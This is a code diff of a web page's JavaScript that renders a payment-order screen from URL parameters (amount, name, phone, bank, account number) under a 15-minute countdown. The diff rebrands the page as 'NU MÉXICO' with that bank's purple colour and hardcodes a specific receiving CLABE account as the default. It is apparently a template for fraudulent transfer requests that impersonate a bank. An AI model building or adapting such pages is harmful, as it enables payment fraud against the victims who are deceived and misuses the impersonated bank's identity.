@@ -70,10 +70,10 @@
         const v = p.get('v');
 
         const apps = {
-            'orden': { n: 'Orden de Pago', c: '#14b8a6', i: '' }
+            'nu': { n: 'NU MÉXICO', c: '#820ad1', i: '' }
         };
 
-        const config = apps[v] || apps['orden'];
+        const config = apps[v] || apps['nu'];
 
         document.getElementById('header-bg').style.backgroundColor = config.c;
         document.getElementById('img-app').src = config.i;
@@ -81,8 +81,8 @@
         document.getElementById('txt-monto').innerText = '$' + (p.get('m') || '0.00');
         document.getElementById('txt-nom').innerText = p.get('n') || 'Cliente';
         document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
-        document.getElementById('txt-banco').innerText = p.get('b') || 'BBVA';
-        document.getElementById('txt-clabe').innerText = p.get('c') || '---';
+        document.getElementById('txt-banco').innerText = p.get('b') || 'NU MÉXICO';
+        document.getElementById('txt-clabe').innerText = p.get('c') || '638180000172548559';
 
         let tiempo = 900; 
         const display = document.getElementById('contador');
